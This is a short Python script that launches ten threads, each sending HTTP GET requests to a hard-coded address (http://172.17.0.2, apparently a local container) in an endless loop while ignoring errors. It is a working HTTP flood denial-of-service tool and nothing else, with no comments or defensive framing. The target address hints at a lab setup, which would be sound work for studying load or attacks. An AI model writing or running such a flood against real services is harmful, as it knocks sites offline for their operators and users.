import requests
import threading


def http_flood(url):
    while True:
        try:
            requests.get(url)
        except Exception as e:
            print("Error:", e)


if __name__ == "__main__":
    target_url = "http://172.17.0.2"
    num_threads = 10

    for _ in range(num_threads):
        thread = threading.Thread(target=http_flood, args=(target_url,))
        thread.start()
